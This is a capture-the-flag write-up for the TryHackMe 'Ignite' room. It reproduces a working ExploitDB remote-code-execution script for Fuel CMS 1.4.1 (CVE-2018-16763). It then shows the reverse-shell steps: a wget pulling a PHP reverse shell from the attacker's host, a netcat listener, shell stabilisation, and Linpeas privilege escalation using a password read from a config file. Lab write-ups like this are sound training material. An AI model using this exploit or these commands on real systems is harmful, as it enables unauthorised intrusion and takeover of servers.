## Ignite - Try Hack Me

## 1. Overview
Some of the main points of this write-up:
- **Fuel CMS**
- **Pythonscript from ExploitDB**
- **php-reverse-shell - Pentestmonkey**
- **Stabilizing the shell**
- **Linpeas**

[Link to the machine](https://tryhackme.com/room/ignite)


## 2. Oppgaver
### 2.1 User.txt

```sh
export IP=10.10.150.222
```

First we run a **NMAP** scan:
```sh
nmap -sV -sC -oA nmap/ $IP
```
Found port 80 open, and we check out the site. It is running something called **Fuel CMS**, and we can access http://10.10.150.222/fuel to get a login page. We successfully log into the admin account with `admin:admin` as credentials.

Furthermore, we googled *FuelCMS vulnerability* and found a python script on [ExploitDB](https://www.exploit-db.com/exploits/47138):
```python
# Exploit Title: fuelCMS 1.4.1 - Remote Code Execution
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763

import requests
import urllib

url = "http://127.0.0.1:8881"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	r = requests.get(burp0_url)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print r.text[0:dup]

```

We changed it a bit, and removed the proxy to burp stuff, as well as changing the IP address to match the target. The function `find_nth_overlapping` will look for the answer from the webserver to our command. If we use the script without this function, it will just return way too much HTML text. So when we run the script and pass in the command `ìd` or `whoami` the server returns this output:

```sh
uid=0(www-data) gid=0(www-data) groups=0(www-data)
```

We then have permission to execute commands on the box. Meaning we can upload our own scripts. We can simply copy a file called php-reverse-shell.php from pentestmonkey. In this file we have to change a few things, in order for it to work. We specify our own IP and choose a random port number. In this case we chose 9003. Here is the github-link to the script that we used:  
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Then we transfer this file over to the victim using **python**, and on our machine we use the following command:
```sh
python3 -m http.server 9002
```

And on the wictims machine we use the following command to cathch the file we want from our machine, which is named rev.php:
```sh
wget http://10.8.33.116:9002/rev.php
```

Now that the file is transfered, we can run it by simply get requedting it through the browser in firefox. And we set up a netcat listener on port 9001, specified above in the re.php file we made:
```sh
nc -lnvp 9001
```

So in the URL field we type in the following:

`http://10.10.150.222/rev.php`

Our listener should catch the shell, and we are in.


#### Stabilizing the shell
So the first thing we have to do is create a more stable shell. Here we can use the poor mans pentest tips from John Hammond, or look back at some IppSec youtube videos. First we run this command:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

Then we use ctr+z to send the shell to the background.

Now back to our own machines shell we type:
```sh
stty raw -echo
```

Then we type `fg` to bring the shell back to the foreground, and we are back with a shell that is more stable and can use tab-autocomplete.


### 2.2 root.txt
Now that we have a stable shell we can upload linpeas to see if there is anything we can use to escalate our privileges. Uploading Linpeas is done in the same way as with the method explained above. We use **python** to create a http server, then use `wget` on the victims machine to pull down the script. Linpeas is found on [this link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

Linpeas found a very interesting file that is readable, and it is the database file.

`/var/www/html/fuel/application/config/database.php: 'password' => 'mememe'`

So the credentials are `root:mememe` and we can just log into the root user just by typing `su`

Now that we are root and can cat out the `root.txt` file.
